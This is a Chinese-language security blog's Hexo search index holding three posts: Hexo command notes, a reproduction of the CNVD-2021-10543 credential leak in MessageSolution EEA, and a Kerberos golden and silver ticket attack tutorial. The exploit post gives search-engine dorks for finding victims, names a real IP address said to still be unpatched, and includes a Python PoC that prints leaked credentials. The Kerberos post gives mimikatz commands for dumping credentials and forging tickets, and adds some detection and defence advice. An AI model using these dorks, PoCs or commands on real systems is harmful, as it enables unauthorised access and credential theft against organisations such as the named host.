<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hello 暗影LXH十三先生</title>
      <link href="2021/03/23/hello-world/"/>
      <url>2021/03/23/hello-world/</url>
      
        <content type="html"><![CDATA[<h3 id="hexo常用命令笔记"><a href="#hexo常用命令笔记" class="headerlink" title="hexo常用命令笔记"></a>hexo常用命令笔记</h3><h6 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h6><p>npm install hexo -g #安装<br>npm update hexo -g #升级<br>hexo init #初始化</p><h6 id="简写"><a href="#简写" class="headerlink" title="简写"></a>简写</h6><p>hexo n “我的博客” == hexo new “我的博客” #新建文章<br>hexo p == hexo publish<br>hexo g == hexo generate#生成<br>hexo s == hexo server #启动服务预览<br>hexo d == hexo deploy#部署</p><h6 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h6><p>hexo server #Hexo 会监视文件变动并自动更新，您无须重启服务器。<br>hexo server -s #静态模式<br>hexo server -p 5000 #更改端口<br>hexo server -i 192.168.1.1 #自定义 IP</p><p>hexo clean #清除缓存 网页正常情况下可以忽略此条命令<br>hexo g #生成静态网页<br>hexo d #开始部署</p><h6 id="监视文件变动"><a href="#监视文件变动" class="headerlink" title="监视文件变动"></a>监视文件变动</h6><p>hexo generate #使用 Hexo 生成静态文件快速而且简单<br>hexo generate –watch #监视文件变动</p><h6 id="完成后部署"><a href="#完成后部署" class="headerlink" title="完成后部署"></a>完成后部署</h6><p>两个命令的作用是相同的<br>hexo generate –deploy<br>hexo deploy –generate</p><p>hexo deploy -g<br>hexo server -g</p><h6 id="草稿"><a href="#草稿" class="headerlink" title="草稿"></a>草稿</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo publish [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure><h6 id="模版"><a href="#模版" class="headerlink" title="模版"></a>模版</h6><p>hexo new “postName” #新建文章<br>hexo new page “pageName” #新建页面<br>hexo generate #生成静态页面至public目录<br>hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）<br>hexo deploy #将.deploy目录部署到GitHub</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo new [layout] &lt;title&gt;</span><br><span class="line">hexo new photo &quot;My Gallery&quot;</span><br><span class="line">hexo new &quot;Hello World&quot; --lang tw</span><br></pre></td></tr></table></figure><h6 id="变量-描述"><a href="#变量-描述" class="headerlink" title="变量    描述"></a>变量    描述</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">layout布局</span><br><span class="line">title标题</span><br><span class="line">date文件建立日期</span><br><span class="line">title: 使用Hexo搭建个人博客</span><br><span class="line">layout: post</span><br><span class="line">date: 2014-03-03 19:07:43</span><br><span class="line">comments: true</span><br><span class="line">categories: Blog</span><br><span class="line">tags: [Hexo]</span><br><span class="line">keywords: Hexo, Blog</span><br><span class="line">description: 生命在于折腾，又把博客折腾到Hexo了。给Hexo点赞。</span><br><span class="line">模版（Scaffold）</span><br><span class="line">hexo new photo &quot;My Gallery&quot;</span><br></pre></td></tr></table></figure><p>变量    描述<br>layout    布局<br>title    标题<br>date    文件建立日期<br>设置文章摘要<br>以上是文章摘要 <a id="more"></a> 以下是余下全文 </p><h5 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hexo new page &lt;title&gt;</span><br><span class="line">hexo new post &lt;title&gt;</span><br><span class="line"></span><br><span class="line">变量描述</span><br><span class="line">:title标题</span><br><span class="line">:year建立的年份（4 位数）</span><br><span class="line">:month建立的月份（2 位数）</span><br><span class="line">:i_month建立的月份（去掉开头的零）</span><br><span class="line">:day建立的日期（2 位数）</span><br><span class="line">:i_day建立的日期（去掉开头的零）</span><br><span class="line">推送到服务器上</span><br><span class="line">hexo n #写文章</span><br><span class="line">hexo g #生成</span><br><span class="line">hexo d #部署 #可与hexo g合并为 hexo d -g</span><br></pre></td></tr></table></figure><p>报错<br>1.找不到git部署<br>ERROR Deployer not found: git<br>解决方法</p><p>npm install hexo-deployer-git –save</p><p>3.部署类型设置git<br>hexo 3.0 部署类型不再是github，_config.yml 中修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: http:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;deployment.html</span><br><span class="line"></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@***.github.com:***&#x2F;***.github.io.git</span><br><span class="line">  branch: master</span><br><span class="line">4. xcodebuild</span><br><span class="line">xcode-select: error: tool &#39;xcodebuild&#39; requires Xcode, but active developer directory &#39;&#x2F;Library&#x2F;Developer&#x2F;CommandLineTools&#39; is a command line tools instance</span><br></pre></td></tr></table></figure><p>npm install bcrypt</p><ol start="5"><li>RSS不显示<br>安装RSS插件<br>npm install hexo-generator-feed –save</li></ol><p>开启RSS功能<br>编辑hexo/_config.yml，添加如下代码：</p><p>rss: /atom.xml #rss地址  默认即可<br>开启评论<br>1.我使用多说代替自带的评论，在多说 网站注册 &gt; 后台管理 &gt; 添加新站点 &gt; 工具 === 复制通用代码 里面有 short_name</p><p>在根目录 _config.yml 添加一行 disqus_shortname: jslite 是在多说注册时产生的</p><p>复制到 themes\landscape\layout_partial\article.ejs<br>把</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (!index &amp;&amp; post.comments &amp;&amp; config.disqus_shortname)&#123; %&gt;</span><br><span class="line">&lt;section id&#x3D;&quot;comments&quot;&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;disqus_thread&quot;&gt;</span><br><span class="line">  &lt;noscript&gt;Please enable JavaScript to view the &lt;a href&#x3D;&quot;&#x2F;&#x2F;disqus.com&#x2F;?ref_noscript&quot;&gt;comments powered by Disqus.&lt;&#x2F;a&gt;&lt;&#x2F;noscript&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;section&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (!index &amp;&amp; post.comments &amp;&amp; config.disqus_shortname)&#123; %&gt;</span><br><span class="line">  &lt;section id&#x3D;&quot;comments&quot;&gt;</span><br><span class="line">    &lt;!-- 多说评论框 start --&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;ds-thread&quot; data-thread-key&#x3D;&quot;&lt;%&#x3D; post.layout %&gt;-&lt;%&#x3D; post.slug %&gt;&quot; data-title&#x3D;&quot;&lt;%&#x3D; post.title %&gt;&quot; data-url&#x3D;&quot;&lt;%&#x3D; page.permalink %&gt;&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;!-- 多说评论框 end --&gt;</span><br><span class="line">    &lt;!-- 多说公共JS代码 start (一个网页只需插入一次) --&gt;</span><br><span class="line">    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    var duoshuoQuery &#x3D; &#123;short_name:&#39;&lt;%&#x3D; config.disqus_shortname %&gt;&#39;&#125;;</span><br><span class="line">      (function() &#123;</span><br><span class="line">        var ds &#x3D; document.createElement(&#39;script&#39;);</span><br><span class="line">        ds.type &#x3D; &#39;text&#x2F;javascript&#39;;ds.async &#x3D; true;</span><br><span class="line">        ds.src &#x3D; (document.location.protocol &#x3D;&#x3D; &#39;https:&#39; ? &#39;https:&#39; : &#39;http:&#39;) + &#39;&#x2F;&#x2F;static.duoshuo.com&#x2F;embed.js&#39;;</span><br><span class="line">        ds.charset &#x3D; &#39;UTF-8&#39;;</span><br><span class="line">        (document.getElementsByTagName(&#39;head&#39;)[0] </span><br><span class="line">         || document.getElementsByTagName(&#39;body&#39;)[0]).appendChild(ds);</span><br><span class="line">      &#125;)();</span><br><span class="line">      &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;!-- 多说公共JS代码 end --&gt;</span><br><span class="line">  &lt;&#x2F;section&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CNVD-2021-10543  MessageSolution 邮件归档系统EEA 漏洞复现</title>
      <link href="2021/03/23/cnvd-2021-10543-messagesolution-you-jian-gui-dang-xi-tong-eea-lou-dong-fu-xian/"/>
      <url>2021/03/23/cnvd-2021-10543-messagesolution-you-jian-gui-dang-xi-tong-eea-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h3 id="一-fofa寻找目标"><a href="#一-fofa寻找目标" class="headerlink" title="一 fofa寻找目标"></a>一 fofa寻找目标</h3><p>Fofa搜索：</p><p>title=”MessageSolution Enterprise Email Archiving (EEA)”</p><p>title=”MessageSolution”</p><p><img src="/images/pasted-20.png" alt="upload successful"></p><p>钟馗之眼搜索：</p><p>title:”MessageSolution”</p><h3 id="二-打开https-IP-indexcommon-jsp"><a href="#二-打开https-IP-indexcommon-jsp" class="headerlink" title="二 打开https://IP/indexcommon.jsp"></a>二 打开<a href="https://ip/indexcommon.jsp">https://IP/indexcommon.jsp</a></h3><p><img src="/images/pasted-21.png" alt="upload successful"></p><h3 id="三-访问-authenticationserverservlet目录直接获取Windows服务器账号密码跟后台账号密码"><a href="#三-访问-authenticationserverservlet目录直接获取Windows服务器账号密码跟后台账号密码" class="headerlink" title="三 访问/authenticationserverservlet目录直接获取Windows服务器账号密码跟后台账号密码"></a>三 访问/authenticationserverservlet目录直接获取Windows服务器账号密码跟后台账号密码</h3><p>例如：<a href="https://58.67.197.253/authenticationserverservlet">https://58.67.197.253/authenticationserverservlet</a></p><p><img src="/images/pasted-22.png" alt="upload successful"></p><h3 id="四-用账号密码登录成功，至今还未修复"><a href="#四-用账号密码登录成功，至今还未修复" class="headerlink" title="四 用账号密码登录成功，至今还未修复"></a>四 用账号密码登录成功，至今还未修复</h3><p><img src="/images/pasted-23.png" alt="upload successful"><br>如果别人也在登录，会显示登录失败</p><h3 id="五-cnvd-2021-10543-py"><a href="#五-cnvd-2021-10543-py" class="headerlink" title="五 cnvd-2021-10543.py"></a>五 cnvd-2021-10543.py</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import random</span><br><span class="line">import re</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">def title():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mVersion: MessageSolution 企业邮件归档管理系统EEA                         \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def POC_1(target_url):</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/authenticationserverservlet/&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == 200 and <span class="string">&quot;administrator&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 目标 &#123;&#125; 存在信息泄露 响应为:&#123;&#125;\033[0m&quot;</span>.format(target_url, response.text))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;</span>.format(target_url))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 目标 &#123;&#125; 请求失败 \033[0m&quot;</span>.format(target_url))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = str(input(<span class="string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    POC_1(target_url)</span><br></pre></td></tr></table></figure><p>执行结果<br><img src="/images/pasted-24.png" alt="upload successful"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>kerberos之猥琐攻击</title>
      <link href="2021/03/23/kerberos-zhi-wei-suo-gong-ji/"/>
      <url>2021/03/23/kerberos-zhi-wei-suo-gong-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="kerberos认证下的猥琐攻击手法"><a href="#kerberos认证下的猥琐攻击手法" class="headerlink" title="kerberos认证下的猥琐攻击手法"></a>kerberos认证下的猥琐攻击手法</h2><h3 id="1-0-黄金票据的原理和条件"><a href="#1-0-黄金票据的原理和条件" class="headerlink" title="1.0 黄金票据的原理和条件"></a>1.0 黄金票据的原理和条件</h3><p><img src="/images/pasted-0.png" alt="upload successful"></p><p>黄金票据是伪造票据授予票据（TGT）。</p><p>票据授予票据（TGT），也被称为认证票据</p><p>黄金票据特点:</p><p>1.与域控制器没有AS-REQ或AS-REP通信<br>2.需要krbtgt用户的hash（KDC Hash）<br>3.由于黄金票据是伪造的TGT，它作为TGS-REQ的一部分被发送到域控制器以获得服务票据<br>我们可以看一个图理解一下：</p><p><img src="/images/pasted-1.png" alt="upload successful"></p><p>Kerberos黄金票据是有效的TGT Kerberos票据，因为它是由域Kerberos帐户（KRBTGT）加密和签名的。TGT仅用于向域控制器上的KDC服务证明用户已被其他域控制器认证。TGT被KRBTGT密码散列加密并且可以被域中的任何KDC服务解密的。</p><h6 id="黄金票据的条件要求："><a href="#黄金票据的条件要求：" class="headerlink" title="黄金票据的条件要求："></a>黄金票据的条件要求：</h6><p>1.域名称<br>2.域的SID值<br>3.域的KRBTGT账户NTLM密码哈希<br>4.伪造用户名<br>1.1 实战手法<br>我们这里在一台域服务器中抓取到了KRBTGT账户的账号密码（hash）</p><p><img src="/images/pasted-2.png" alt="upload successful"></p><p>那么这里我们可以直接使用cobalt strike来利用黄金票据</p><p><img src="/images/pasted-3.png" alt="upload successful"></p><p>填入必须值</p><p><img src="/images/pasted-4.png" alt="upload successful"></p><p>就可以了</p><p><img src="/images/pasted-5.png" alt="upload successful"></p><p>在TGT的使用期限超过20分钟之前，域控制器KDC服务不会验证TGT中的用户帐户，这意味着我们可以使用已禁用/删除的帐户，甚至可以使用Active Directory中不存在的虚构帐户。</p><p>由于在域控制器上由KDC服务生成票证时会在票证上设置域Kerberos策略，因此当提供票证时，系统会信任票证的有效性。这意味着即使域策略声明Kerberos登录票证（TGT）仅有效期为10个小时，如果票证声明其有效期为10年，则是10年。</p><p>该KRBTGT帐户密码从不更改*和直到KRBTGT密码被更改（两次），我们可以创建黄金票据。注意，即使模拟的用户更改了密码，为模拟用户而创建的黄金票据也会保留。</p><p>黄金票据可以绕过了SmartCard身份验证要求，因为它绕过了DC在创建TGT之前执行的常规检查。</p><p>黄金票证（TGT）可以在任何计算机上生成和使用，即使其中一台未加入域也是可以的。</p><p>当然我们也可以使用Mimikatz伪造Kerberos票证：</p><p>1.2 Mimikatz命令示例：<br>kerberos :: golden / admin：ADMIINACCOUNTNAME / domain：DOMAINFQDN / id：ACCOUNTRID / sid：DOMAINSID / krbtgt：KRBTGTPASSWORDHASH / ptt</p><p><img src="/images/pasted-6.png" alt="upload successful"></p><p>Mimikatz创建黄金的命令是“kerberos :: golden”</p><p>mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:<KRBTGT NTLM Hash> /user:&lt;任意用户名&gt; /ptt” exit</p><p>/domain —–完整的域名，在这个例子中：“lab.adsecurity.org”</p><p>/ sid —-域的SID,在这个例子中：“S-1-5-21-1473643419-774954089-2222329127”</p><p>/ sids — AD森林中账户/组的额外SID，凭证拥有权限进行欺骗。通常这将是根域Enterprise Admins组的“S-1-5-21-1473643419-774954089-5872329127-519”值。Ť </p><p> / user —伪造的用户名</p><p>/ groups（可选）—用户所属的组RID（第一组是主组）。添加用户或计算机帐户RID以接收相同的访问权限。默认组：513,512,520,518,519为默认的管理员组。</p><p>/ krbtgt—域KDC服务帐户（KRBTGT）的NTLM密码哈希值。用于加密和签署TGT。</p><p>/ ticket（可选） - 提供一个路径和名称，用于保存Golden Ticket文件以便日后使用或使用/ ptt立即将黄金票据插入内存以供使用。</p><p>/ ptt - 作为/ ticket的替代品 - 使用它来立即将伪造的票据插入到内存中以供使用。</p><p>/ id（可选） - 用户RID。Mimikatz默认值是500（默认管理员帐户RID）。</p><p>/ startoffset（可选） - 票据可用时的起始偏移量（如果使用此选项，通常设置为-10或0）。Mimikatz默认值是0。</p><p>/ endin（可选） - 票据使用时间范围。Mimikatz默认值是10年（〜5,262,480分钟）。Active Directory默认Kerberos策略设置为10小时（600分钟）。</p><p>/ renewmax（可选） - 续订最长票据有效期。Mimikatz默认值是10年（〜5,262,480分钟）。Active Directory默认Kerberos策略设置为7天（10,080分钟）。</p><p>/ sids（可选） - 设置为AD林中企业管理员组（ADRootDomainSID）-519）的SID，以欺骗整个AD林（AD林中每个域中的AD管理员）的企业管理权限。</p><p>/ aes128 - AES128密钥</p><p>/ aes256 - AES256密钥</p><p>黄金票默认组：</p><p>域用户SID：S-1-5-21 <DOMAINID> -513</p><p>域管理员SID：S-1-5-21 <DOMAINID> -512</p><p>架构管理员SID：S-1-5-21 <DOMAINID> -518</p><p>企业管理员SID：S-1-5-21 <DOMAINID> -519（只有在森林根域中创建伪造票证时才有效，但为AD森林管理员权限添加使用/ sids参数）</p><p>组策略创建者所有者SID：S-1-5-21 <DOMAINID> -520</p><p>命令格式如下：</p><p>kerberos :: golden / user：ADMIINACCOUNTNAME / domain：DOMAINFQDN / id：ACCOUNTRID / sid：DOMAINSID / krbtgt：KRBTGTPASSWORDHASH / ptt</p><p>命令示例：<br>.\mimikatz “kerberos::golden  /user:DarthVader  /domain:rd.lab.adsecurity.org  /id:500 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321  /ptt” exit</p><h3 id="2-0-白银票据的原理和条件"><a href="#2-0-白银票据的原理和条件" class="headerlink" title="2.0 白银票据的原理和条件"></a>2.0 白银票据的原理和条件</h3><p>银票是伪造的票证授予服务票，也称为服务票。</p><p>如下图所示，与域控制器之间没有AS-REQ / AS-REP（步骤1和2），也没有TGS-REQ / TGS-REP（步骤3和4）通信。由于白银票据是伪造的TGS，因此无法与域控制器通信。</p><p><img src="/images/pasted-7.png" alt="upload successful"></p><p>该Kerberos的银票是有效的票证授予服务（TGS）Kerberos票据，它是加密/通过与配置的服务帐户登录服务主体名称为每个服务器与Kerberos身份验证的服务运行。</p><p>黄金票证是伪造的TGT，可有效访问任何Kerberos服务，而银票证是伪造的TGS。这意味着银票范围仅限于特定服务器上针对的任何服务。</p><p>使用域Kerberos服务帐户（KRBTGT）对黄金票证进行加密/签名时，通过服务帐户（从计算机的本地SAM或服务帐户凭据中提取的计算机帐户凭据）对银票进行加密/签名。</p><p>大多数服务不会验证PAC（通过将PAC校验和发送到域控制器以进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以包含完全虚构的PAC-甚至声称用户是域管理员。</p><p>TGS是伪造的，因此没有关联的TGT，这意味着不用链接DC，任何事件日志都位于目标服务器上。尽管范围比金牌更有限，但所需的哈希值更容易获得，并且在使用时与DC没有通信，因此检测比黄金票证更困难。</p><p>2.1 条件<br>当拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。</p><p>/target –目标服务器的FQDN</p><p>FQDN：(Fully Qualified Domain Name)全限定域名：同时带有主机名和域名的名称。（通过符号“.”）</p><p>/service –运行在目标服务器上的kerberos服务，该服务主体名称类型如cifs，http，mssql等</p><p>/rc4 –服务的NTLM散列（计算机帐户或用户帐户）</p><blockquote><p>PS:Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。<br>所以，一切凭据都来源于Server Hash。</p></blockquote><p>2.2 伪造白银票据(Silver Tickets)<br>首先需要导出Server Hash：</p><p>管理员权限运行mimikatz</p><p>mimikatz “privilege::debug” “sekurlsa::logonpasswords” “exit”  &gt; “C:\Users\Administrator.WEB\Desktop\1.txt”<br>privilege::debug #提升权限<br>sekurlsa::logonpasswords #获取service账户hash 和sid(同一个域下得sid一样)</p><p>我这里在cobalt strike中演示</p><p><img src="/images/pasted-8.png" alt="upload successful"></p><p>空本地票据缓存</p><p>kerberos::purge #清理本地票据缓存<br>kerberos::list #查看本地保存的票据</p><p><img src="/images/pasted-9.png" alt="upload successful"></p><p>伪造白银票据并导入</p><p>mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:<NTLM Hash> /user:&lt;用户名&gt; /ptt” exit</p><p><img src="/images/pasted-10.png" alt="upload successful"></p><p>Mimikatz命令示例：<br>/domain –完整的域名称，如：lab.adsecurity.org</p><p>/sid –域的SID，如：S-1-5-21-1473643419-774954089-2222329127</p><p>/user – 域用户名</p><p>/ groups（可选） - 用户所属的组RID</p><p>/ ticket（可选） - 提供一个路径和名称，用于保存Golden Ticket文件以便日后使用，或者使用/ ptt立即将黄金票据插入到内存中以供使用</p><p> /ptt - 作为/ ticket的替代品，使用它来立即将伪造的票据插入到内存中以供使用。</p><p>/ id（可选） - 用户RID，Mimikatz默认值是500（默认管理员帐户RID）</p><p>/ startoffset（可选） - 票证可用时的起始偏移（如果使用此选项，通常设置为-10或0）Mimikatz默认值是0</p><p>/ endin（可选） - 票据有效时间，Mimikatz默认值是10年，Active Directory默认Kerberos策略设置为10小时</p><p>/ renewmax（可选） - 续订最长票据有效时间，Mimikatz默认值是10年，Active Directory默认Kerberos策略设置为最长为7天</p><p> 白银票据默认组</p><p>域用户SID：S-1-5-21 <DOMAINID> -513<br>域管理员SID：S-1-5-21 <DOMAINID> -512<br>架构管理员SID：S-1-5-21 <DOMAINID> -518<br>企业管理员SID：S-1-5-21 <DOMAINID> -519<br>组策略创建所有者SID：S-1-5-21 <DOMAINID> -520<br>白银票据在各种服务中的实列<br> Service Type                                  Service Silver Tickets<br> WMI                                           HOST RPCSS<br> PowerShell Remoting                           HOST  HTTP<br> WinRM                                         HOST  HTTP<br> Scheduled Tasks                               HOST<br> Windows File Share (CIFS)                     CIFS</p><p> LDAP operations including<br> Mimikatz DCSync                               LDAP</p><p> Windows Remote Server Administration Tools    RPCSS LDAP CIFS</p><p>伪造Windows共享（CIFS）管理访问的银票</p><p>通过为cifs服务创建白银票据，以获得目标计算机上任何Windows共享的管理权限</p><h3 id="3-0-黄金票据和白银票据区别"><a href="#3-0-黄金票据和白银票据区别" class="headerlink" title="3.0 黄金票据和白银票据区别"></a>3.0 黄金票据和白银票据区别</h3><p>1.TGS ticket针对的是某个机器上的某个服务，TGT针对的是所有机器的所有服务<br>2.TGT利用krbtgt账户的hash，TGS ticket利用的是服务账户的hash（目标机的hash,以计算机名$显示的账户）</p><p>黄金票据的实验结果：<br>能够在域里边所有机器上都以administrator登录</p><p>白银票据的实验结果：<br>以前就能够psexec的，使用白银票据添加cifs为administrator权限后，能够在psexec之后以administrator登录</p><p>以前就不能后动psexesvc的机器，实用白银票据添加cifs后，dir由无权查看变为有权查看</p><p>hash位置<br>运行中的系统，需要从内存抓取-&gt;lassas.exe进程里边存放的是活动用户的hash（当前登录的用户）普通域用户或普通工作组：SAM文件（加密后的用户密码）/SYSTEM文件（秘钥）windows/system32/config/SAM存的是当前机器所用户的Hash</p><p>域控：ntds.dit所有域用户的账号/密码（hash）</p><h3 id="4-0-检测伪造的Kerberos票证"><a href="#4-0-检测伪造的Kerberos票证" class="headerlink" title="4.0 检测伪造的Kerberos票证"></a>4.0 检测伪造的Kerberos票证</h3><p>4.1 白银票据(Silver Tickets)防御<br>1.尽量保证服务器凭证不被窃取</p><p>2.开启PAC (Privileged Attribute Certificate) 特权属性证书保护 功能，PAC主要是规定服务器将票据发送给kerberos服务，由 kerberos服务验证票据是否有效。</p><p>开启方式:</p><p>将注册表中</p><p>HKEY_LOCAL_MACHINE\SYSTEM \ CurrentControlSet\Control\Lsa\Kerberos\Parameters</p><p>中的ValidateKdcPacSignature设置为1。<br>3.侦测</p><p>监视异常的Kerberos活动，例如Windows登录/注销事件中的格式错误或空白字段（事件ID 4624、4634、4672）。[2]</p><p>监视与lsass.exe交互的意外进程。[6]诸如Mimikatz之类的通用凭证转储者通过打开进程，找到LSA秘密密钥并解密内存中存储凭证详细信息（包括Kerberos票证）的部分，来访问LSA子系统服务（LSASS）进程。</p><p>4.2 黄金票据(Silver Tickets)防御</p><p>1.限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机。这降低攻击者通过横向扩展，获取域管理员的账户，获得访问域控制器的Active Directory的ntds.dit的权限。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码。</p><p>2.建议定期更改KRBTGT密码。更改一次，然后让AD备份，并在12到24小时后再次更改它。这个过程应该对系统环境没有影响。这个过程应该是确保KRBTGT密码每年至少更改一次的标准方法。</p><p>3.一旦攻击者获得了KRBTGT帐号密码哈希的访问权限，就可以随意创建黄金票据。通过快速更改KRBTGT密码两次，使任何现有的黄金票据（以及所有活动的Kerberos票据）失效。这将使所有Kerberos票据无效，并消除攻击者使用其KRBTGT创建有效金票的能力。</p><p>4.侦测<br>监视异常的Kerberos活动，例如Windows登录/注销事件（事件ID 4624、4672、4634）中的格式错误或空白字段，TGT中的RC4加密以及TGS请求，而无需前面的TGT请求。</p><p>监视TGT票证的生存期，以获取与默认域持续时间不同的值。</p><h3 id="5-0-Kerberoasting攻击"><a href="#5-0-Kerberoasting攻击" class="headerlink" title="5.0 Kerberoasting攻击"></a>5.0 Kerberoasting攻击</h3><p><img src="/images/pasted-11.png" alt="upload successful"></p><p>Kerberos协议在请求访问某个服务时存在一个缺陷，Kerberoasting正是利用这个缺陷的一种攻击技术。</p><p>我们可以破解服务帐户密码，而无需拿到管理员的账号密码哈希。我们通过在主机中使用服务帐户请求TGS票证多项服务。从内存中导出TGS票证，然后破解就可以。也可以通过嗅探网络流量并脱机获取使用RC4_HMAC_MD5加密的Kerberos TGS票证来攻击。</p><p>5.1 攻击流程<br>1、用户将AS-REQ数据包发送给KDC（Key Distribution 